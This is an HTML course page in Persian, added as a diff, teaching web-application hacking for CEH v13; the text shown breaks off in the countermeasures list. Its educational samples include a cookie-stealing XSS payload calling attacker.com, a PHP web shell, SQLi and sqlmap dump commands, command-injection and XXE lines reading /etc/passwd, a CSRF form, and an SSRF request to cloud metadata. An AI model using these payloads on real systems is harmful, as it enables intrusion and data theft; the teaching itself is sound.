@@ -1,0 +1,1011 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ماژول ۱۴ - Hacking Web Applications - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .toc {
+            background: #eef3f7;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border-right: 4px solid #2a7de1;
+        }
+        .toc ul {
+            columns: 2;
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+        .toc ul li {
+            margin: 6px 0;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .toc ul li:hover {
+            background: #dce3ea;
+        }
+        .toc ul li a {
+            text-decoration: none;
+            color: #0b3b5c;
+            font-weight: 500;
+        }
+        .toc ul li a:hover {
+            color: #2a7de1;
+        }
+        .copy-btn {
+            background: #2a7de1;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #1a5fb0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: #4a5a7a;
+        }
+        .code-block .copy-btn:hover {
+            background: #2a7de1;
+        }
+        @media (max-width: 768px) {
+            .toc ul { columns: 1; }
+        }
+        table tr:hover {
+            background: #e8f0fe !important;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../../../index.html">خانه</a> |
+            <a href="../index.html">ماژول‌ها</a>
+        </span>
+    </div>
+
+    <h1>📚 ماژول ۱۴ – Hacking Web Applications</h1>
+
+    <!-- ===== فهرست مطالب ===== -->
+    <div class="toc">
+        <strong>📑 فهرست مطالب (کلیک کنید):</strong>
+        <ul>
+            <li><a href="#intro">🔰 مقدمه – برنامه‌های وب و حملات به آنها</a></li>
+            <li><a href="#architecture">🏗️ معماری برنامه‌های وب</a></li>
+            <li><a href="#owasp">📋 OWASP Top 10</a></li>
+            <li><a href="#sql-injection">🗄️ تزریق SQL (SQL Injection)</a></li>
+            <li><a href="#xss">💉 Cross-Site Scripting (XSS)</a></li>
+            <li><a href="#csrf">🔄 Cross-Site Request Forgery (CSRF)</a></li>
+            <li><a href="#session-hijacking">🔑 ربودن جلسه (Session Hijacking)</a></li>
+            <li><a href="#file-upload">📤 آسیب‌پذیری آپلود فایل</a></li>
+            <li><a href="#idor">🔐 IDOR (Insecure Direct Object Reference)</a></li>
+            <li><a href="#command-injection">⌨️ تزریق دستور (Command Injection)</a></li>
+            <li><a href="#xxe">📄 XXE (XML External Entity)</a></li>
+            <li><a href="#ssrf">🌐 SSRF (Server-Side Request Forgery)</a></li>
+            <li><a href="#tools">🛠️ ابزارهای هک برنامه‌های وب</a></li>
+            <li><a href="#ai-web-app">🤖 هوش مصنوعی در هک برنامه‌های وب</a></li>
+            <li><a href="#countermeasures">🛡️ راه‌های مقابله</a></li>
+            <li><a href="#lab-exercise">🧪 کارگاه عملی</a></li>
+            <li><a href="#practice-exercises">📝 تمرین‌های عملی</a></li>
+            <li><a href="#glossary">📖 واژه‌نامه تخصصی</a></li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card" id="intro">
+        <h2>🔰 مقدمه – برنامه‌های وب و حملات به آنها</h2>
+        <p>
+            <b>برنامه‌های وب (Web Applications)</b> نرم‌افزارهایی هستند که از طریق مرورگر وب قابل دسترسی هستند و تعامل پویایی با کاربران دارند. این برنامه‌ها امروزه قلب تپنده کسب‌وکارهای آنلاین، بانک‌داری، شبکه‌های اجتماعی و خدمات ابری هستند.
+        </p>
+        <p>
+            با افزایش محبوبیت برنامه‌های وب، حملات به آنها نیز به یکی از رایج‌ترین تهدیدات سایبری تبدیل شده است. حملات به برنامه‌های وب می‌توانند به سرقت اطلاعات حساس، دستکاری داده‌ها، و حتی کنترل کامل سرور منجر شوند.
+        </p>
+        <p>
+            در این ماژول، با رایج‌ترین آسیب‌پذیری‌های برنامه‌های وب (بر اساس OWASP Top 10)، روش‌های شناسایی، بهره‌برداری و مقابله با آنها آشنا خواهید شد.
+        </p>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> حملات به برنامه‌های وب بدون مجوز جرم هستند. تمام تمرینات این ماژول فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: معماری برنامه‌های وب -->
+    <!-- ============================================================ -->
+    <div class="card" id="architecture">
+        <h2>🏗️ معماری برنامه‌های وب (Web Application Architecture)</h2>
+        <p>
+            برای درک آسیب‌پذیری‌های برنامه‌های وب، ابتدا باید معماری آنها را بشناسید:
+        </p>
+
+        <h3>📌 اجزای اصلی:</h3>
+        <ul>
+            <li><b>کلاینت (Client):</b> مرورگر کاربر که درخواست‌ها را ارسال می‌کند.</li>
+            <li><b>وب‌سرور (Web Server):</b> درخواست‌ها را دریافت و صفحات را ارائه می‌دهد.</li>
+            <li><b>اپلیکیشن سرور (Application Server):</b> منطق برنامه را اجرا می‌کند (PHP, ASP.NET, Node.js, Python).</li>
+            <li><b>پایگاه داده (Database):</b> داده‌های برنامه را ذخیره می‌کند.</li>
+            <li><b>APIها:</b> ارتباط بین اجزا را مدیریت می‌کنند.</li>
+        </ul>
+
+        <h3>📌 مدل‌های معماری:</h3>
+        <ul>
+            <li><b>Single-Tier:</b> همه اجزا روی یک سرور.</li>
+            <li><b>Two-Tier:</b> کلاینت و سرور (Client-Server).</li>
+            <li><b>Three-Tier:</b> کلاینت، سرور برنامه، پایگاه داده.</li>
+            <li><b>N-Tier (Microservices):</b> چندین سرویس مجزا.</li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> هرچه معماری پیچیده‌تر باشد، نقاط حمله بیشتری وجود دارد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: OWASP Top 10 -->
+    <!-- ============================================================ -->
+    <div class="card" id="owasp">
+        <h2>📋 OWASP Top 10</h2>
+        <p>
+            <b>OWASP (Open Web Application Security Project)</b> یک سازمان غیرانتفاعی است که به بهبود امنیت برنامه‌های وب می‌پردازد. لیست ۱۰ آسیب‌پذیری برتر OWASP (OWASP Top 10) یک مرجع استاندارد برای شناسایی خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است.
+        </p>
+
+        <h3>📌 OWASP Top 10 (نسخه ۲۰۲۱):</h3>
+        <ol>
+            <li><b>شکست در کنترل دسترسی (Broken Access Control):</b> نقض سیاست‌های دسترسی.</li>
+            <li><b>شکست در رمزنگاری (Cryptographic Failures):</b> استفاده از رمزنگاری ضعیف یا عدم استفاده.</li>
+            <li><b>تزریق (Injection):</b> تزریق کد مخرب (SQL, Command, LDAP).</li>
+            <li><b>طراحی ناامن (Insecure Design):</b> نقص در طراحی امنیتی برنامه.</li>
+            <li><b>پیکربندی ناامن (Security Misconfiguration):</b> تنظیمات اشتباه امنیتی.</li>
+            <li><b>اجزای آسیب‌پذیر و قدیمی (Vulnerable and Outdated Components):</b> استفاده از کتابخانه‌های قدیمی.</li>
+            <li><b>شکست در شناسایی و احراز هویت (Identification and Authentication Failures):</b> ضعف در احراز هویت.</li>
+            <li><b>شکست در یکپارچگی نرم‌افزار و داده (Software and Data Integrity Failures):</b> نقض یکپارچگی داده‌ها.</li>
+            <li><b>شکست در نظارت و لاگ‌گیری (Security Logging and Monitoring Failures):</b> عدم پایش کافی.</li>
+            <li><b>جعل درخواست بین‌سایتی (Server-Side Request Forgery - SSRF):</b> درخواست‌های جعلی از سمت سرور.</li>
+        </ol>
+
+        <div class="info-box">
+            <b>💡 نکته:</b> OWASP Top 10 به‌روزترین منبع برای شناسایی آسیب‌پذیری‌های رایج برنامه‌های وب است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: SQL Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="sql-injection">
+        <h2>🗄️ تزریق SQL (SQL Injection - SQLi)</h2>
+        <p>
+            <b>SQL Injection</b> یکی از معروف‌ترین و خطرناک‌ترین آسیب‌پذیری‌های برنامه‌های وب است که در آن مهاجم با تزریق کد SQL به ورودی‌های برنامه، به پایگاه داده دسترسی پیدا می‌کند.
+        </p>
+
+        <h3>📌 انواع SQL Injection:</h3>
+        <ul>
+            <li><b>In-band SQLi:</b> مهاجم از همان کانال برای تزریق و دریافت داده استفاده می‌کند.</li>
+            <li><b>Blind SQLi:</b> مهاجم پاسخ مستقیم دریافت نمی‌کند و از تفاوت‌های برنامه استفاده می‌کند.</li>
+            <li><b>Out-of-band SQLi:</b> مهاجم از کانال دیگری برای دریافت داده استفاده می‌کند.</li>
+        </ul>
+
+        <h3>📌 مثال SQL Injection:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># کد آسیب‌پذیر PHP
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+
+# حمله: تزریق ' OR '1'='1
+# ورودی: username = admin' --  (یا admin' OR '1'='1)
+# کوئری نهایی: SELECT * FROM users WHERE username='admin' --' AND password=''
+# که همیشه true برمی‌گرداند</code></pre>
+        </div>
+
+        <h3>📌 ابزارهای SQL Injection:</h3>
+        <ul>
+            <li><b>SQLmap:</b> ابزار خودکار برای تشخیص و بهره‌برداری از SQLi.</li>
+            <li><b>Burp Suite:</b> با پسوندهای مختلف.</li>
+            <li><b>Havij:</b> ابزار گرافیکی.</li>
+            <li><b>jSQL:</b> ابزار جاوا.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از SQLmap برای تشخیص SQLi
+sqlmap -u "http://192.168.1.101/page.php?id=1" --dbs
+
+# استخراج جداول
+sqlmap -u "http://192.168.1.101/page.php?id=1" -D database_name --tables
+
+# استخراج داده‌ها
+sqlmap -u "http://192.168.1.101/page.php?id=1" -D database_name -T table_name --dump</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> SQL Injection می‌تواند به نشت کامل داده‌های پایگاه داده منجر شود. همیشه ورودی‌ها را فیلتر کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: XSS -->
+    <!-- ============================================================ -->
+    <div class="card" id="xss">
+        <h2>💉 Cross-Site Scripting (XSS)</h2>
+        <p>
+            <b>XSS</b> یک آسیب‌پذیری است که در آن مهاجم کدهای جاوااسکریپت مخرب را به صفحات وب تزریق می‌کند. این کدها در مرورگر قربانی اجرا شده و می‌توانند کوکی‌ها را بدزدند، صفحات را تغییر دهند یا حملات فیشینگ انجام دهند.
+        </p>
+
+        <h3>📌 انواع XSS:</h3>
+        <ul>
+            <li><b>Reflected XSS:</b> کد مخرب در URL یا فرم ارسال شده و بلافاصله بازگردانده می‌شود.</li>
+            <li><b>Stored XSS (Persistent):</b> کد مخرب در پایگاه داده ذخیره می‌شود و برای همه کاربران نمایش داده می‌شود.</li>
+            <li><b>DOM-based XSS:</b> کد مخرب از طریق دستکاری DOM در مرورگر اجرا می‌شود.</li>
+        </ul>
+
+        <h3>📌 مثال XSS:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># تزریق کد جاوااسکریپت
+<script>alert('Hacked!')</script>
+
+# سرقت کوکی
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+
+# تغییر محتوای صفحه
+<script>document.write('<h1>Hacked!</h1>')</script></code></pre>
+        </div>
+
+        <h3>📌 ابزارهای XSS:</h3>
+        <ul>
+            <li><b>Burp Suite:</b> برای تست دستی.</li>
+            <li><b>OWASP ZAP:</b> اسکن خودکار XSS.</li>
+            <li><b>XSStrike:</b> ابزار تخصصی XSS.</li>
+            <li><b>BeEF:</b> چارچوب بهره‌برداری از مرورگر.</li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> برای جلوگیری از XSS، ورودی‌ها را فیلتر کنید و از توابع escape مانند <code dir='ltr'>htmlspecialchars()</code> استفاده کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: CSRF -->
+    <!-- ============================================================ -->
+    <div class="card" id="csrf">
+        <h2>🔄 Cross-Site Request Forgery (CSRF)</h2>
+        <p>
+            <b>CSRF</b> یک حمله است که در آن مهاجم کاربر را فریب می‌دهد تا یک درخواست ناخواسته را به یک وب‌سایت که کاربر به آن اعتماد دارد، ارسال کند. این حمله از کوکی‌های ذخیره‌شده در مرورگر برای احراز هویت استفاده می‌کند.
+        </p>
+
+        <h3>📌 نحوه عملکرد:</h3>
+        <ol>
+            <li>کاربر وارد وب‌سایت هدف می‌شود (کوکی فعال است).</li>
+            <li>کاربر روی یک لینک مخرب کلیک می‌کند یا از یک وب‌سایت آلوده بازدید می‌کند.</li>
+            <li>وب‌سایت آلوده یک درخواست به وب‌سایت هدف ارسال می‌کند (با استفاده از کوکی کاربر).</li>
+            <li>وب‌سایت هدف درخواست را به عنوان درخواست معتبر کاربر پردازش می‌کند.</li>
+        </ol>
+
+        <h3>📌 مثال CSRF:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>&lt;img src="http://bank.com/transfer?amount=1000&to=attacker" /&gt;
+
+&lt;form action="http://bank.com/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="amount" value="1000" /&gt;
+    &lt;input type="hidden" name="to" value="attacker" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+        </div>
+
+        <h3>📌 راه‌های مقابله با CSRF:</h3>
+        <ul>
+            <li><b>CSRF Tokens:</b> افزودن توکن تصادفی به فرم‌ها و تأیید آن در سرور.</li>
+            <li><b>SameSite Cookies:</b> تنظیم کوکی با SameSite=Strict یا Lax.</li>
+            <li><b>Referer/Origin Validation:</b> بررسی هدر Referer.</li>
+            <li><b>احراز هویت چندعاملی (MFA):</b> برای تراکنش‌های حساس.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> CSRF یکی از خطرناک‌ترین حملات است و می‌تواند باعث انتقال وجه، تغییر رمز و سایر اقدامات مخرب شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="session-hijacking">
+        <h2>🔑 ربودن جلسه (Session Hijacking)</h2>
+        <p>
+            <b>ربودن جلسه</b> در برنامه‌های وب به سرقت شناسه جلسه (Session ID) کاربر و استفاده از آن برای دسترسی به حساب کاربری گفته می‌شود. این حمله معمولاً پس از احراز هویت انجام می‌شود.
+        </p>
+
+        <h3>📌 روش‌های ربودن جلسه در برنامه‌های وب:</h3>
+        <ul>
+            <li><b>سرقت کوکی:</b> از طریق XSS، Sniffing، یا مهندسی اجتماعی.</li>
+            <li><b>Session Fixation:</b> تحمیل Session ID به کاربر قبل از ورود.</li>
+            <li><b>MITM:</b> شنود ترافیک HTTP و استخراج Session ID.</li>
+            <li><b>Predictable Session ID:</b> حدس Session IDهای ضعیف.</li>
+        </ul>
+
+        <h3>📌 مثال Session Hijacking:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استخراج کوکی با XSS
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
+
+# استفاده از کوکی دزدیده شده در مرورگر مهاجم
+# تنظیم کوکی در Developer Tools -> Application -> Cookies
+# بازسازی جلسه با همان Session ID</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> استفاده از تنظیمات <code dir='ltr'>HttpOnly</code> و <code dir='ltr'>Secure</code> برای کوکی‌ها، و تغییر Session ID پس از ورود، از Session Hijacking جلوگیری می‌کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: آپلود فایل -->
+    <!-- ============================================================ -->
+    <div class="card" id="file-upload">
+        <h2>📤 آسیب‌پذیری آپلود فایل (File Upload Vulnerability)</h2>
+        <p>
+            آسیب‌پذیری آپلود فایل زمانی رخ می‌دهد که یک برنامه وب به کاربران اجازه می‌دهد فایل‌هایی را آپلود کنند بدون اینکه به درستی نوع و محتوای فایل را بررسی کند. این آسیب‌پذیری می‌تواند به اجرای کد مخرب روی سرور منجر شود.
+        </p>
+
+        <h3>📌 حملات رایج آپلود فایل:</h3>
+        <ul>
+            <li><b>آپلود Web Shell:</b> آپلود یک فایل PHP/ASP که به مهاجم دسترسی به سرور می‌دهد.</li>
+            <li><b>آپلود بدافزار:</b> قرار دادن بدافزار روی سرور.</li>
+            <li><b>Directory Traversal:</b> آپلود فایل در دایرکتوری‌های حساس.</li>
+            <li><b>Double Extension:</b> استفاده از پسوندهای دوگانه (مثل .php.jpg).</li>
+            <li><b>MIME Type Bypass:</b> تغییر نوع MIME فایل برای دور زدن فیلترها.</li>
+        </ul>
+
+        <h3>📌 مثال Web Shell:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>&lt;?php system($_GET['cmd']); ?&gt;
+
+# آپلود فایل با نام shell.php
+# سپس اجرای دستورات از طریق:
+http://192.168.1.101/uploads/shell.php?cmd=id</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> آپلود Web Shell یکی از رایج‌ترین راه‌های نفوذ به سرور است. همیشه فایل‌های آپلودی را به دقت بررسی کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: IDOR -->
+    <!-- ============================================================ -->
+    <div class="card" id="idor">
+        <h2>🔐 IDOR (Insecure Direct Object Reference)</h2>
+        <p>
+            <b>IDOR</b> یک آسیب‌پذیری کنترل دسترسی است که در آن برنامه وب به کاربران اجازه می‌دهد به اشیاء (مانند فایل‌ها، رکوردهای پایگاه داده) بدون بررسی مجوز دسترسی پیدا کنند.
+        </p>
+
+        <h3>📌 مثال IDOR:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># درخواست معمولی کاربر:
+GET /user/profile?id=123
+
+# حمله IDOR: تغییر ID به ID کاربر دیگر
+GET /user/profile?id=124
+
+# اگر برنامه مجوز را بررسی نکند، مهاجم به پروفایل کاربر دیگر دسترسی پیدا می‌کند.</code></pre>
+        </div>
+
+        <h3>📌 تشخیص IDOR:</h3>
+        <ul>
+            <li>بررسی پارامترهای URL و فرم‌ها برای شناسه‌های عددی یا قابل حدس.</li>
+            <li>تغییر شناسه‌ها و مشاهده پاسخ سرور.</li>
+            <li>استفاده از Burp Suite برای دستکاری درخواست‌ها.</li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> برای جلوگیری از IDOR، همیشه مجوز دسترسی کاربر را قبل از نمایش هر داده‌ای بررسی کنید و از شناسه‌های غیرقابل حدس (مانند UUID) استفاده کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: Command Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="command-injection">
+        <h2>⌨️ تزریق دستور (Command Injection)</h2>
+        <p>
+            <b>Command Injection</b> زمانی رخ می‌دهد که برنامه وب، ورودی کاربر را بدون فیلتر کردن به عنوان دستور سیستم‌عامل اجرا می‌کند. این آسیب‌پذیری به مهاجم اجازه می‌دهد دستورات دلخواه را روی سرور اجرا کند.
+        </p>
+
+        <h3>📌 مثال Command Injection:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># کد آسیب‌پذیر PHP
+$command = $_GET['cmd'];
+system($command);
+
+# حمله: ارسال دستور از طریق URL
+http://192.168.1.101/page.php?cmd=id
+http://192.168.1.101/page.php?cmd=ls%20-la
+http://192.168.1.101/page.php?cmd=cat%20/etc/passwd</code></pre>
+        </div>
+
+        <h3>📌 ابزارهای Command Injection:</h3>
+        <ul>
+            <li><b>Burp Suite:</b> برای تست دستی.</li>
+            <li><b>Commix:</b> ابزار خودکار Command Injection.</li>
+            <li><b>Metasploit:</b> ماژول‌های Command Injection.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> Command Injection یکی از خطرناک‌ترین آسیب‌پذیری‌هاست و می‌تواند به کنترل کامل سرور منجر شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: XXE -->
+    <!-- ============================================================ -->
+    <div class="card" id="xxe">
+        <h2>📄 XXE (XML External Entity Injection)</h2>
+        <p>
+            <b>XXE</b> یک آسیب‌پذیری است که در برنامه‌هایی که XML را پردازش می‌کنند، رخ می‌دهد. مهاجم با تزریق یک موجودیت خارجی، می‌تواند فایل‌های سیستمی را بخواند، درخواست‌های SSRF انجام دهد یا باعث DoS شود.
+        </p>
+
+        <h3>📌 مثال XXE:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> برای جلوگیری از XXE، پردازش موجودیت‌های خارجی را در پردازشگر XML غیرفعال کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: SSRF -->
+    <!-- ============================================================ -->
+    <div class="card" id="ssrf">
+        <h2>🌐 SSRF (Server-Side Request Forgery)</h2>
+        <p>
+            <b>SSRF</b> یک آسیب‌پذیری است که در آن مهاجم می‌تواند سرور را وادار کند تا درخواست‌هایی به آدرس‌های دلخواه (مثل سرورهای داخلی) ارسال کند.
+        </p>
+
+        <h3>📌 مثال SSRF:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># پارامتر آسیب‌پذیر: url=http://example.com
+GET /fetch?url=http://internal-server/admin
+
+# حمله: دسترسی به سرورهای داخلی
+GET /fetch?url=http://169.254.169.254/latest/meta-data/  # (در AWS)</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> SSRF می‌تواند به افشای اطلاعات حساس از سرورهای داخلی منجر شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۳: ابزارهای هک برنامه‌های وب -->
+    <!-- ============================================================ -->
+    <div class="card" id="tools">
+        <h2>🛠️ ابزارهای هک برنامه‌های وب</h2>
+        <p>
+            ابزارهای متعددی برای تست و هک برنامه‌های وب وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>ابزار</th><th>کاربرد اصلی</th><th>توضیح</th></tr>
+                <tr>
+                    <td><b>Burp Suite</b></td>
+                    <td>تست نفوذ وب</td>
+                    <td>قدرتمندترین ابزار، با قابلیت Proxy, Scanner, Repeater, Intruder</td>
+                </tr>
+                <tr>
+                    <td><b>OWASP ZAP</b></td>
+                    <td>تست نفوذ وب</td>
+                    <td>نسخه متن‌باز Burp Suite</td>
+                </tr>
+                <tr>
+                    <td><b>SQLmap</b></td>
+                    <td>SQL Injection</td>
+                    <td>ابزار خودکار تشخیص و بهره‌برداری SQLi</td>
+                </tr>
+                <tr>
+                    <td><b>Nikto</b></td>
+                    <td>اسکن وب‌سرور</td>
+                    <td>بررسی پیکربندی و آسیب‌پذیری‌ها</td>
+                </tr>
+                <tr>
+                    <td><b>Gobuster</b></td>
+                    <td>اسکن دایرکتوری</td>
+                    <td>پیدا کردن دایرکتوری‌ها و فایل‌های مخفی</td>
+                </tr>
+                <tr>
+                    <td><b>XSStrike</b></td>
+                    <td>XSS</td>
+                    <td>ابزار تخصصی XSS</td>
+                </tr>
+                <tr>
+                    <td><b>Commix</b></td>
+                    <td>Command Injection</td>
+                    <td>ابزار خودکار Command Injection</td>
+                </tr>
+                <tr>
+                    <td><b>WPScan</b></td>
+                    <td>هک وردپرس</td>
+                    <td>اسکن آسیب‌پذیری وردپرس</td>
+                </tr>
+                <tr>
+                    <td><b>BeEF</b></td>
+                    <td>بهره‌برداری از مرورگر</td>
+                    <td>چارچوب XSS و کنترل مرورگر</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Burp Suite (راه‌اندازی)
+burpsuite
+
+# استفاده از SQLmap
+sqlmap -u "http://192.168.1.101/page.php?id=1" --dbs
+
+# استفاده از XSStrike
+xsstrike -u "http://192.168.1.101/page.php?q=test"
+
+# استفاده از Commix
+commix --url "http://192.168.1.101/page.php?cmd=ping"</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Burp Suite و SQLmap دو تا از قدرتمندترین ابزارهای هک برنامه‌های وب هستند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۴: هوش مصنوعی در هک برنامه‌های وب -->
+    <!-- ============================================================ -->
+    <div class="card" id="ai-web-app">
+        <h2>🤖 هوش مصنوعی در هک برنامه‌های وب</h2>
+        <p>
+            CEH v13 به عنوان <b>اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده</b>، به نقش هوش مصنوعی در هک برنامه‌های وب نیز می‌پردازد.
+        </p>
+
+        <h3>📌 نقش هوش مصنوعی در هک برنامه‌های وب:</h3>
+        <ul>
+            <li><b>تشخیص خودکار آسیب‌پذیری‌ها:</b> AI می‌تواند کد برنامه را تحلیل کرده و آسیب‌پذیری‌ها را پیدا کند.</li>
+            <li><b>تولید Payloadهای هوشمند:</b> AI می‌تواند payloadهایی تولید کند که از تشخیص فرار کنند.</li>
+            <li><b>اسکن هوشمند:</b> AI می‌تواند اسکن‌های هدفمند و کارآمدتری انجام دهد.</li>
+            <li><b>تحلیل لاگ‌ها:</b> AI می‌تواند الگوهای حمله را در لاگ‌ها پیدا کند.</li>
+        </ul>
+
+        <h3>📌 ابزارهای AI-Powered Web Application Hacking:</h3>
+        <ul>
+            <li><b>AI-Based Vulnerability Scanners:</b> اسکنرهای مبتنی بر AI.</li>
+            <li><b>AI-Powered Payload Generators:</b> تولید payloadهای هوشمند.</li>
+            <li><b>AI-Driven WAF Bypass:</b> دور زدن WAF با AI.</li>
+        </ul>
+
+        <div class="info-box">
+            <b>💡 چرا هوش مصنوعی در هک برنامه‌های وب مهم است؟</b>
+            <p>
+                هوش مصنوعی می‌تواند آسیب‌پذیری‌های پیچیده‌تر را شناسایی کند و حملات را به گونه‌ای طراحی کند که از WAF و IDS عبور کند.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۵: راه‌های مقابله -->
+    <!-- ============================================================ -->
+    <div class="card" id="countermeasures">
+        <h2>🛡️ راه‌های مقابله با حملات برنامه‌های وب</h2>
+        <p>
+            برای محافظت از برنامه‌های وب در برابر حملات، سازمان‌ها و توسعه‌دهندگان باید اقدامات زیر را انجام دهند:
+        </p>
+
+        <h3>📌 اقدامات کلی:</h3>
+        <ul>
+            <li><b>فیلتر کردن ورودی‌ها (Input Validation):</b> تمام ورودی‌های کاربر را اعتبارسنجی کنید.</li>
+            <li><b>استفاده از Prepared Statements:</b> برای جلوگیری از SQL Injection.</li>
+            <li><b>رمزگشایی خروجی‌ها (Output Encoding):</b> برای جلوگیری از XSS.</li>
+            <li><b>استفاده از CSRF Tokens:</b> در تمام فرم‌های حساس.</li>
+            <li><b>تنظیمات امن کوکی:</b> HttpOnly, Secure, SameSite.</li>
+            <li><b>استفاده از WAF (Web Application Firewall):</b> محافظت در برابر حملات.</li>
+            <li><b>به‌روزرسانی منظم:</b> نصب وصله‌های امنیتی.</li>
+            <li><b>آموزش توسعه‌دهندگان:</b> آموزش کدنویسی امن.</li>
+        </ul>
+
+        <h3>📌 اقدامات خاص برای هر نوع حمله:</h3>
+        <ul>
+            <li><b>SQL Injection:</b> Prepared Statements, Stored Procedures, Input Validation.</li>
